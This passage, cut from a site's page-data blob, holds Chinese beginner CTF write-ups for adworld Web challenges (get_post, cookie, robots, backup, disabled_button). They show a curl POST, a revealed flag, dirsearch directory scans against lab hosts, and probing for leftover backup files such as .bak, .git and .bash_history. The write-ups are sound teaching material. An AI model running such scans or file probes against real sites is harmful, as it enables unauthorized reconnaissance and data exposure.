方法二：使用Postman等网页调试和接口测试工具",content:'根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第2道题\n\n\n\n * 题目描述:\n * 考点：\n * 解体思路：\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称       题目方向   难度\nGFSJ0475   get_post   Web    1\n\n\n# 题目2：get_post\n\n\n# 题目描述:\n\nX老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？\n\n\n# 考点：\n\n * GET方法和POST方法的使用\n\n> 这里提到的GET和POST方法，是指HTTP协议，即【超文本传输协议】中的请求方式，在该协议中，不只有GET和POST方法。\n> \n>  1. ‌GET‌：用于请求服务器发送资源，通常用于请求数据。GET请求不会修改服务器上的资源，它只是从服务器获取数据。GET请求的参数会附加在URL后面，因此不适合传输敏感信息。\n>  2. ‌POST‌：用于向指定资源提交数据，通常用于提交表单或上传文件。POST请求会导致服务器资源的更改或创建新的资源。\n>  3. ‌PUT‌：用于替换目标资源的所有当前表示，通常用于更新或替换服务器上的资源。\n>  4. ‌PATCH‌：用于对已知资源进行局部更新，仅修改资源的一部分。\n>  5. ‌DELETE‌：用于请求服务器删除指定的资源。\n>  6. ‌CONNECT‌：预留给能够将连接改为管道方式的代理服务器使用。\n>  7. ‌TRACE‌：用于回显服务器收到的请求，主要用于调试和诊断。\n>  8. ‌OPTIONS‌：返回服务器支持的HTTP请求方法，用于客户端查看服务器的性能。\n>  9. ‌HEAD‌：类似于GET请求，但响应中不返回消息体，仅返回头部信息，常用于检查资源的存在性和内容类型。\n\n\n# 解体思路：\n\n进入页面后，提示“请用GET方式提交一个名为a,值为1的变量”，根据提示，添加参数a=1，可以直接在浏览器进行请求，默认即是GET请求。\n\n注：在GET方法添加参数时，要加英文的?后再加参数，参数赋值要用=号。\n\nhttp://61.147.171.105:63699?a=1\n\n\n1\n\n\n在请求后，返回了新的提示“请用GET方式提交一个名为a,值为1的变量，请再以POST方式随便提交一个名为b,值为2的变量”。此时我们思考如何发送一个post请求，单纯使用浏览器已经不能满足当下的需求。\n\n# 方法一：使用curl命令来请求，需要一定的linux基础\n\n可以使用快捷键win+r，然后输入cmd，即可进入Windows系统的命令行工具，进入后输入如下命令：\n\ncurl -X POST -d "b=2" http://61.147.171.105:63699/?a=1\n\n\n1\n\n\n然后可以得到返回，即可看到返回的flag。\n\n\ufeff<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>POST&GET</title>\n    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />\n\n</head>\n<body>\n\n<h1>请用GET方式提交一个名为a,值为1的变量</h1>\n\n<h1>请再以POST方式随便提交一个名为b,值为2的变量</h1><h1>cyberpeace{96dc5cc0cd80f278b18ff8cc69dab0a7}</h1>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 方法二：使用Postman等网页调试和接口测试工具\n\n这里需要安装Postman等网页调试和接口测试工具，这里不做赘述，选择POST方法，在Body也就是请求体中加入参数，使用form表单提交，即可得到flag。',normalizedContent:'根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第2道题\n\n\n\n * 题目描述:\n * 考点：\n * 解体思路：\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称       题目方向   难度\ngfsj0475   get_post   web    1\n\n\n# 题目2：get_post\n\n\n# 题目描述:\n\nx老师告诉小宁同学http通常使用两种请求方法，你知道是哪两种吗？\n\n\n# 考点：\n\n * get方法和post方法的使用\n\n> 这里提到的get和post方法，是指http协议，即【超文本传输协议】中的请求方式，在该协议中，不只有get和post方法。\n> \n>  1. ‌get‌：用于请求服务器发送资源，通常用于请求数据。get请求不会修改服务器上的资源，它只是从服务器获取数据。get请求的参数会附加在url后面，因此不适合传输敏感信息。\n>  2. ‌post‌：用于向指定资源提交数据，通常用于提交表单或上传文件。post请求会导致服务器资源的更改或创建新的资源。\n>  3. ‌put‌：用于替换目标资源的所有当前表示，通常用于更新或替换服务器上的资源。\n>  4. ‌patch‌：用于对已知资源进行局部更新，仅修改资源的一部分。\n>  5. ‌delete‌：用于请求服务器删除指定的资源。\n>  6. ‌connect‌：预留给能够将连接改为管道方式的代理服务器使用。\n>  7. ‌trace‌：用于回显服务器收到的请求，主要用于调试和诊断。\n>  8. ‌options‌：返回服务器支持的http请求方法，用于客户端查看服务器的性能。\n>  9. ‌head‌：类似于get请求，但响应中不返回消息体，仅返回头部信息，常用于检查资源的存在性和内容类型。\n\n\n# 解体思路：\n\n进入页面后，提示“请用get方式提交一个名为a,值为1的变量”，根据提示，添加参数a=1，可以直接在浏览器进行请求，默认即是get请求。\n\n注：在get方法添加参数时，要加英文的?后再加参数，参数赋值要用=号。\n\nhttp://61.147.171.105:63699?a=1\n\n\n1\n\n\n在请求后，返回了新的提示“请用get方式提交一个名为a,值为1的变量，请再以post方式随便提交一个名为b,值为2的变量”。此时我们思考如何发送一个post请求，单纯使用浏览器已经不能满足当下的需求。\n\n# 方法一：使用curl命令来请求，需要一定的linux基础\n\n可以使用快捷键win+r，然后输入cmd，即可进入windows系统的命令行工具，进入后输入如下命令：\n\ncurl -x post -d "b=2" http://61.147.171.105:63699/?a=1\n\n\n1\n\n\n然后可以得到返回，即可看到返回的flag。\n\n\ufeff<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>post&get</title>\n    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />\n\n</head>\n<body>\n\n<h1>请用get方式提交一个名为a,值为1的变量</h1>\n\n<h1>请再以post方式随便提交一个名为b,值为2的变量</h1><h1>cyberpeace{96dc5cc0cd80f278b18ff8cc69dab0a7}</h1>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 方法二：使用postman等网页调试和接口测试工具\n\n这里需要安装postman等网页调试和接口测试工具，这里不做赘述，选择post方法，在body也就是请求体中加入参数，使用form表单提交，即可得到flag。',charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-05",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-05",date:"2024-11-16T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-16-4-CTF-cookie-WriteUp.html",relativePath:"views/essay/2024-11-16-4-CTF-cookie-WriteUp.md",key:"v-4d0a18f4",path:"/views/essay/2024-11-16-4-CTF-cookie-WriteUp.html",headers:[{level:3,title:"题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’",slug:"题目描述-x老师告诉小宁他在cookie里放了些东西-小宁疑惑地想-这是夹心饼干的意思吗",normalizedTitle:"题目描述：x老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’",charIndex:48},{level:3,title:"考点1： 网络基础（session）",slug:"考点1-网络基础-session",normalizedTitle:"考点1： 网络基础（session）",charIndex:99},{level:3,title:"考点2： F12开发者工具",slug:"考点2-f12开发者工具",normalizedTitle:"考点2： f12开发者工具",charIndex:121},{level:3,title:"解题思路1：找到Cookie的文件，flag应该在Cookie文件里",slug:"解题思路1-找到cookie的文件-flag应该在cookie文件里",normalizedTitle:"解题思路1：找到cookie的文件，flag应该在cookie文件里",charIndex:138},{level:3,title:"解题思路2：通过抓包工具，分析信息",slug:"解题思路2-通过抓包工具-分析信息",normalizedTitle:"解题思路2：通过抓包工具，分析信息",charIndex:176}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第5题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0478</td>\n<td>cookie</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ 考点1： 网络基础（session） 考点2： F12开发者工具 解题思路1：找到Cookie的文件，flag应该在Cookie文件里 解题思路2：通过抓包工具，分析信息",content:"根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第5题\n\n\n\n * 题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’\n * 考点1： 网络基础（session）\n * 考点2： F12开发者工具\n * 解题思路1：找到Cookie的文件，flag应该在Cookie文件里\n * 解题思路2：通过抓包工具，分析信息\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称     题目方向   难度\nGFSJ0478   cookie   Web    1\n\n\n# 题目5：cookie\n\n\n# 题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’\n\n\n# 考点1： 网络基础（session）\n\n\n# 考点2： F12开发者工具\n\n\n# 解题思路1：找到Cookie的文件，flag应该在Cookie文件里\n\n打开网页后，提示“你知道什么是Cookie吗？”，这时我们应该用快捷键F12打开开发者工具，然后切换到Application页面，找到Storage下的Cookies，整体浏览一遍，看到最后一个Cookie是look-here，这显然是不正常的Cookie\n\n\n\n我们看到这条Cookie的内容，是一个文件cookie.php，我们尝试访问这个文件，页面提示我们“See the http response”，这时我们切换到Network页面，找到cookie.php这个请求，点开以后，我们直接查看Response\n\n\n\n此时发现并没有我们想要的flag，除此之外，我们还能想到Response Header也可能会藏信息，所以我们打开Headers页，整体浏览后找到我们要的flag\n\n\n\n> Cookie【引用】有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。\n> \n> 很多网站多会用这种方式，会弹窗请求允许访问Cookie，这是因为欧盟的协议，违者重罚\n\n总结重点：Cookie是服务器为了辨别用户身份，将信息存储在用户计算机上的文件，通常为加密的文本文件\n\n\n# 解题思路2：通过抓包工具，分析信息\n\n其他师傅尝试使用burp抓包工具，抓取Cookie信息，得到look-here=cookie.php，访问该文件/cookie.php，重新抓一下包，在Headers里得到了Flag。\n\n注：这种方式我并没有尝试过",normalizedContent:"根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第5题\n\n\n\n * 题目描述：x老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’\n * 考点1： 网络基础（session）\n * 考点2： f12开发者工具\n * 解题思路1：找到cookie的文件，flag应该在cookie文件里\n * 解题思路2：通过抓包工具，分析信息\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称     题目方向   难度\ngfsj0478   cookie   web    1\n\n\n# 题目5：cookie\n\n\n# 题目描述：x老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’\n\n\n# 考点1： 网络基础（session）\n\n\n# 考点2： f12开发者工具\n\n\n# 解题思路1：找到cookie的文件，flag应该在cookie文件里\n\n打开网页后，提示“你知道什么是cookie吗？”，这时我们应该用快捷键f12打开开发者工具，然后切换到application页面，找到storage下的cookies，整体浏览一遍，看到最后一个cookie是look-here，这显然是不正常的cookie\n\n\n\n我们看到这条cookie的内容，是一个文件cookie.php，我们尝试访问这个文件，页面提示我们“see the http response”，这时我们切换到network页面，找到cookie.php这个请求，点开以后，我们直接查看response\n\n\n\n此时发现并没有我们想要的flag，除此之外，我们还能想到response header也可能会藏信息，所以我们打开headers页，整体浏览后找到我们要的flag\n\n\n\n> cookie【引用】有时也用其复数形式 cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。\n> \n> 很多网站多会用这种方式，会弹窗请求允许访问cookie，这是因为欧盟的协议，违者重罚\n\n总结重点：cookie是服务器为了辨别用户身份，将信息存储在用户计算机上的文件，通常为加密的文本文件\n\n\n# 解题思路2：通过抓包工具，分析信息\n\n其他师傅尝试使用burp抓包工具，抓取cookie信息，得到look-here=cookie.php，访问该文件/cookie.php，重新抓一下包，在headers里得到了flag。\n\n注：这种方式我并没有尝试过",charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-03",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-03",date:"2024-11-16T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-16-2-CTF-robots-WriteUp.html",relativePath:"views/essay/2024-11-16-2-CTF-robots-WriteUp.md",key:"v-1e7d03d4",path:"/views/essay/2024-11-16-2-CTF-robots-WriteUp.html",headers:[{level:3,title:"题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。",slug:"题目描述-x老师上课讲了robots协议-小宁同学却上课打了瞌睡-赶紧来教教小宁robots协议是什么吧。",normalizedTitle:"题目描述：x老师上课讲了robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁robots协议是什么吧。",charIndex:48},{level:3,title:"考点1： Robots协议",slug:"考点1-robots协议",normalizedTitle:"考点1： robots协议",charIndex:105},{level:3,title:"考点2： 扫描文件工具的使用",slug:"考点2-扫描文件工具的使用",normalizedTitle:"考点2： 扫描文件工具的使用",charIndex:122},{level:3,title:"解题思路1：依据题目提示和经验，想到Rotots.txt文件",slug:"解题思路1-依据题目提示和经验-想到rotots-txt文件",normalizedTitle:"解题思路1：依据题目提示和经验，想到rotots.txt文件",charIndex:140},{level:3,title:"解题思路2：使用扫描目录的脚本工具dirsearch",slug:"解题思路2-使用扫描目录的脚本工具dirsearch",normalizedTitle:"解题思路2：使用扫描目录的脚本工具dirsearch",charIndex:174}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第3题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0476</td>\n<td>robots</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 考点1： Robots协议 考点2： 扫描文件工具的使用 解题思路1：依据题目提示和经验，想到Rotots.txt文件 解题思路2：使用扫描目录的脚本工具dirsearch",content:"根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第3题\n\n\n\n * 题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n * 考点1： Robots协议\n * 考点2： 扫描文件工具的使用\n * 解题思路1：依据题目提示和经验，想到Rotots.txt文件\n * 解题思路2：使用扫描目录的脚本工具dirsearch\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称     题目方向   难度\nGFSJ0476   robots   Web    1\n\n\n# 题目3：robots\n\n\n# 题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n\n\n# 考点1： Robots协议\n\n\n# 考点2： 扫描文件工具的使用\n\n\n# 解题思路1：依据题目提示和经验，想到Rotots.txt文件\n\n\n\n进入页面后，发现并没有内容，根据题目描述的提示，这里我们直接在URL链接后加上一个Robots协议的路径，即/robots.txt\n\n\n\n根据图中给出的文件，我们修改路径为/f1ag_1s_h3re.php，访问后即可得到flag\n\n\n# 解题思路2：使用扫描目录的脚本工具dirsearch\n\n通过使用dirsearch，扫目录可以扫到robots.txt文件:\n\npython dirsearch.py -u http://10.10.10.175:32793/ -e *\n\n\n1\n\n\n> 这种方法本人未使用过，需要下载对应的工具【传送门】\n\n之后的步骤同方法1",normalizedContent:"根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第3题\n\n\n\n * 题目描述：x老师上课讲了robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁robots协议是什么吧。\n * 考点1： robots协议\n * 考点2： 扫描文件工具的使用\n * 解题思路1：依据题目提示和经验，想到rotots.txt文件\n * 解题思路2：使用扫描目录的脚本工具dirsearch\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称     题目方向   难度\ngfsj0476   robots   web    1\n\n\n# 题目3：robots\n\n\n# 题目描述：x老师上课讲了robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁robots协议是什么吧。\n\n\n# 考点1： robots协议\n\n\n# 考点2： 扫描文件工具的使用\n\n\n# 解题思路1：依据题目提示和经验，想到rotots.txt文件\n\n\n\n进入页面后，发现并没有内容，根据题目描述的提示，这里我们直接在url链接后加上一个robots协议的路径，即/robots.txt\n\n\n\n根据图中给出的文件，我们修改路径为/f1ag_1s_h3re.php，访问后即可得到flag\n\n\n# 解题思路2：使用扫描目录的脚本工具dirsearch\n\n通过使用dirsearch，扫目录可以扫到robots.txt文件:\n\npython dirsearch.py -u http://10.10.10.175:32793/ -e *\n\n\n1\n\n\n> 这种方法本人未使用过，需要下载对应的工具【传送门】\n\n之后的步骤同方法1",charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-04",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-04",date:"2024-11-16T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-16-3-CTF-backup-WriteUp.html",relativePath:"views/essay/2024-11-16-3-CTF-backup-WriteUp.md",key:"v-3a8b6ed4",path:"/views/essay/2024-11-16-3-CTF-backup-WriteUp.html",headers:[{level:3,title:"题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！",slug:"题目描述-x老师忘记删除备份文件-他派小宁同学去把备份文件找出来-一起来帮小宁同学吧",normalizedTitle:"题目描述：x老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！",charIndex:48},{level:3,title:"考点1： php基础",slug:"考点1-php基础",normalizedTitle:"考点1： php基础",charIndex:95},{level:3,title:"考点2： index.php的备份文件",slug:"考点2-index-php的备份文件",normalizedTitle:"考点2： index.php的备份文件",charIndex:109},{level:3,title:"解题思路1：根据题目描述的提示和经验，备份文件通常是 bak有关",slug:"解题思路1-根据题目描述的提示和经验-备份文件通常是-bak有关",normalizedTitle:"解题思路1：根据题目描述的提示和经验，备份文件通常是 bak有关",charIndex:132},{level:3,title:"解题思路2：可以使用工具扫描",slug:"解题思路2-可以使用工具扫描",normalizedTitle:"解题思路2：可以使用工具扫描",charIndex:168}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第4题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0477</td>\n<td>backup</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ 考点1： php基础 考点2： index.php的备份文件 解题思路1：根据题目描述的提示和经验，备份文件通常是 bak有关 解题思路2：可以使用工具扫描",content:"根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第4题\n\n\n\n * 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n * 考点1： php基础\n * 考点2： index.php的备份文件\n * 解题思路1：根据题目描述的提示和经验，备份文件通常是 bak有关\n * 解题思路2：可以使用工具扫描\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称     题目方向   难度\nGFSJ0477   backup   Web    1\n\n\n# 题目4：backup\n\n\n# 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n\n\n# 考点1： php基础\n\n\n# 考点2： index.php的备份文件\n\n\n# 解题思路1：根据题目描述的提示和经验，备份文件通常是 bak有关\n\n访问给出的地址，得到如下页面\n\n\n\n根据提示，我们访问路径http://61.147.171.105:62802/index.php.bakup\n\n提示未找到文件，之后我们访问http://61.147.171.105:62802/index.php.bak\n\n此时浏览器弹出下载提示，下载后打开文件（我使用的是NotePad++，如果没有这个工具的话，可以使用记事本打开），即可得到目标flag。\n\n> 常用的备份文件后缀有\n> \n> .git .svn .swp .~ .bak .bash_history等等\n\n\n# 解题思路2：可以使用工具扫描\n\n这里使用dirsearch工具扫描路径\n\npython dirsearch.py -u http://10.10.10.175:32770 -e *\n\n\n1\n\n\n得到index.php.bak文件，下载后即可得到flag",normalizedContent:"根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第4题\n\n\n\n * 题目描述：x老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n * 考点1： php基础\n * 考点2： index.php的备份文件\n * 解题思路1：根据题目描述的提示和经验，备份文件通常是 bak有关\n * 解题思路2：可以使用工具扫描\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称     题目方向   难度\ngfsj0477   backup   web    1\n\n\n# 题目4：backup\n\n\n# 题目描述：x老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n\n\n# 考点1： php基础\n\n\n# 考点2： index.php的备份文件\n\n\n# 解题思路1：根据题目描述的提示和经验，备份文件通常是 bak有关\n\n访问给出的地址，得到如下页面\n\n\n\n根据提示，我们访问路径http://61.147.171.105:62802/index.php.bakup\n\n提示未找到文件，之后我们访问http://61.147.171.105:62802/index.php.bak\n\n此时浏览器弹出下载提示，下载后打开文件（我使用的是notepad++，如果没有这个工具的话，可以使用记事本打开），即可得到目标flag。\n\n> 常用的备份文件后缀有\n> \n> .git .svn .swp .~ .bak .bash_history等等\n\n\n# 解题思路2：可以使用工具扫描\n\n这里使用dirsearch工具扫描路径\n\npython dirsearch.py -u http://10.10.10.175:32770 -e *\n\n\n1\n\n\n得到index.php.bak文件，下载后即可得到flag",charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"CTF攻防世界入门题单WriteUP-adworld-06",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-06",date:"2024-11-17T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-17-1-CTF-disabled_button-WriteUp.html",relativePath:"views/essay/2024-11-17-1-CTF-disabled_button-WriteUp.md",key:"v-31a8500c",path:"/views/essay/2024-11-17-1-CTF-disabled_button-WriteUp.html",headers:[{level:3,title:"题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？",slug:"题目描述-x老师今天上课讲了前端知识-然后给了大家一个不能按的按钮-小宁惊奇地发现这个按钮按不下去-到底怎么才能按下去呢",normalizedTitle:"题目描述：x老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？",charIndex:48},{level:3,title:"考点1： HTML基础",slug:"考点1-html基础",normalizedTitle:"考点1： html基础",charIndex:113},{level:3,title:"考点2： F12开发者工具",slug:"考点2-f12开发者工具",normalizedTitle:"考点2： f12开发者工具",charIndex:128},{level:3,title:"解题思路1：进入F12工具，修改HTML的属性",slug:"解题思路1-进入f12工具-修改html的属性",normalizedTitle:"解题思路1：进入f12工具，修改html的属性",charIndex:145},{level:3,title:"解题思路2：模拟页面上的表单提交，绕过按钮直接请求",slug:"解题思路2-模拟页面上的表单提交-绕过按钮直接请求",normalizedTitle:"解题思路2：模拟页面上的表单提交，绕过按钮直接请求",charIndex:172}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第6题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0479</td>\n<td>disabled_button</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 考点1： HTML基础 考点2： F12开发者工具 解题思路1：进入F12工具，修改HTML的属性 解题思路2：模拟页面上的表单提交，绕过按钮直接请求",content:'根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第6题\n\n\n\n * 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n * 考点1： HTML基础\n * 考点2： F12开发者工具\n * 解题思路1：进入F12工具，修改HTML的属性\n * 解题思路2：模拟页面上的表单提交，绕过按钮直接请求\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称              题目方向   难度\nGFSJ0479   disabled_button   Web    1\n\n\n# 题目6：disabled_button\n\n\n# 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n\n\n# 考点1： HTML基础\n\n\n# 考点2： F12开发者工具\n\n\n# 解题思路1：进入F12工具，修改HTML的属性\n\n进入目标网页后，我们打开F12开发者工具，然后选择元素，点击页面中的按钮\n\n\n\n这时我们可以看到这个按钮是一个表单，而HTML基础告诉我们，这里的标签下 disabled="" 这个属性不正常，鼠标右键选中，选择“Edit as HTML”，删掉 disabled="" 这个属性，然后点击其他元素即可保存。\n\n<input disabled="" class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth">\n\n\n1\n\n\n保存后页面中的这个button即可点击，点击后得到Flag。\n\n\n# 解题思路2：模拟页面上的表单提交，绕过按钮直接请求\n\n查看官方WriteUp后，找到了另一种方法，具体操作是鼠标右键，查看网页源代码，找到这个表单\n\n<form action="" method="post" >\n    <input disabled class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth" />\n</form>\n\n\n1\n2\n3\n\n\n我们可以看到，这个form表单的方法是post，这个button的name属性是auth，而value属性是flag，根据HTML基础得知，这里如果点击后，会产生一个form表单提交，参数是auth=flag，官方WriteUp题解使用了工具HackBar，我使用的是Postman，向服务器发送一个POST请求，返回中即可找到flag\n\n',normalizedContent:'根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，我的第6题\n\n\n\n * 题目描述：x老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n * 考点1： html基础\n * 考点2： f12开发者工具\n * 解题思路1：进入f12工具，修改html的属性\n * 解题思路2：模拟页面上的表单提交，绕过按钮直接请求\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称              题目方向   难度\ngfsj0479   disabled_button   web    1\n\n\n# 题目6：disabled_button\n\n\n# 题目描述：x老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n\n\n# 考点1： html基础\n\n\n# 考点2： f12开发者工具\n\n\n# 解题思路1：进入f12工具，修改html的属性\n\n进入目标网页后，我们打开f12开发者工具，然后选择元素，点击页面中的按钮\n\n\n\n这时我们可以看到这个按钮是一个表单，而html基础告诉我们，这里的标签下 disabled="" 这个属性不正常，鼠标右键选中，选择“edit as html”，删掉 disabled="" 这个属性，然后点击其他元素即可保存。\n\n<input disabled="" 